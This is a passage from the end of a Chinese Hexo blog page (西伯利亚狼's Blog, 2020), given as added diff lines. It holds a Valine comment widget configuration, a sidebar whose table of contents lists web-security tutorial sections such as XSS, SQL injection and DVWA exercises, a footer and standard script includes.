+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xx","appKey":"xx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-07-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web安全/">web安全<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/web安全/">web安全<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#1web%E5%AE%89%E5%85%A8%E5%88%9D%E5%A7%8B%E9%98%B6%E6%AE%B5"><span class="toc-article-text">1web安全初始阶段</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-web%E7%AE%80%E4%BB%8B"><span class="toc-article-text">1 web简介</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-web%E9%80%9A%E4%BF%A1"><span class="toc-article-text">2 web通信</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-web%E5%BC%80%E5%8F%91"><span class="toc-article-text">3 web开发</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#1-HTML"><span class="toc-article-text">1  HTML</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2-JavaScript"><span class="toc-article-text">2  JavaScript</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-web%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%8E%AF%E5%A2%83"><span class="toc-article-text">3 web服务端环境</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-SQL"><span class="toc-article-text">4 SQL</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#5-php"><span class="toc-article-text">5  php</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-%E8%A1%A5%E5%85%85"><span class="toc-article-text">5 补充</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#2-web%E5%AE%89%E5%85%A8"><span class="toc-article-text">2 web安全</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link"><span class="toc-article-text"></span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-article-text">1  常见的安全问题</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90"><span class="toc-article-text">2 常见web漏洞解析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#1-XSS"><span class="toc-article-text">1 XSS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#XSS%E5%88%86%E7%B1%BB"><span class="toc-article-text">XSS分类</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2-CSRF"><span class="toc-article-text">2 CSRF</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-article-text">3 点击劫持</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-URL%E8%B7%B3%E8%BD%AC"><span class="toc-article-text">4 URL跳转</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#5-SQL%E6%B3%A8%E5%85%A5"><span class="toc-article-text">5 SQL注入</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#3-Web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7"><span class="toc-article-text">3 Web安全工具</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%92%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8B%93%E5%B1%95%E5%88%9D%E7%BA%A7"><span class="toc-article-text">1 浏览器和浏览器拓展初级</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#1-%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8"><span class="toc-article-text">1 安全测试之浏览器入门</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-%E4%BB%A3%E7%90%86%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-article-text">2 代理抓包分析工具</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%88%9D%E7%BA%A7"><span class="toc-article-text">3 Web漏洞扫描工具初级</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#1-%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B"><span class="toc-article-text">1 敏感文件探测</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E5%85%A5%E9%97%A8"><span class="toc-article-text">2 漏洞扫描工具入门</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8"><span class="toc-article-text">3  SQL注入漏洞测试入门</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-article-text">4 在线工具使用</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#4-web%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5"><span class="toc-article-text">4 web安全实践</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#1-DVWA%E9%83%A8%E7%BD%B2"><span class="toc-article-text">1 DVWA部署</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-article-text">2 暴力破解</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-article-text">3 命令注入</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AE%9E%E6%88%98%EF%BC%9A"><span class="toc-article-text">实战：</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-article-text">修复</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-CSRF"><span class="toc-article-text">4 CSRF</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-article-text">5 文件包含</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Low%E7%AD%89%E7%BA%A7%E6%93%8D%E4%BD%9C"><span class="toc-article-text">Low等级操作</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-article-text">攻击——本地文件读取</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-article-text">攻击——本地文件执行</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-article-text">攻击——远程文件执行</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E6%80%9D%E8%B7%AF"><span class="toc-article-text">攻击者思路</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Medium%E7%AD%89%E7%BA%A7%E6%93%8D%E4%BD%9C"><span class="toc-article-text">Medium等级操作</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-article-text">本地文件读取</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-article-text">远程文件执行</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#High%E7%AD%89%E7%BA%A7"><span class="toc-article-text">High等级</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-1"><span class="toc-article-text">攻击——本地文件读取</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C-1"><span class="toc-article-text">攻击——远程文件执行</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E6%80%9D%E8%B7%AF-1"><span class="toc-article-text">攻击者思路</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-article-text">6文件上传</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Low%E7%AD%89%E7%BA%A7"><span class="toc-article-text">Low等级</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Medium%E7%AD%89%E7%BA%A7"><span class="toc-article-text">Medium等级</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#High%E7%AD%89%E7%BA%A7-1"><span class="toc-article-text">High等级</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#impossible%E7%AD%89%E7%BA%A7"><span class="toc-article-text">impossible等级</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-article-text">修复</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#7-SQL%E6%B3%A8%E5%85%A5"><span class="toc-article-text">7  SQL注入</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5POC"><span class="toc-article-text">三种注入POC</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%89%E7%A7%8Dmysql%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-article-text">三种mysql注释符</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%94%E7%BB%83"><span class="toc-article-text">演练</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SQL%E7%9B%B2%E6%B3%A8"><span class="toc-article-text">SQL盲注</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%B8%AD%E7%AD%89%E9%9A%BE%E5%BA%A6"><span class="toc-article-text">中等难度</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%AB%98%E7%BA%A7"><span class="toc-article-text">高级</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#impossible%E7%AD%89%E7%BA%A7-1"><span class="toc-article-text">impossible等级</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#8-XSS"><span class="toc-article-text">8 XSS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B"><span class="toc-article-text">反射型</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-article-text">存储型</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#9-SDL"><span class="toc-article-text">9 SDL</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86"><span class="toc-article-text">10 漏洞和事件处理</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#11-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%A6%82%E8%BF%B0"><span class="toc-article-text">11  安全运营概述</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2020 西伯利亚狼's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
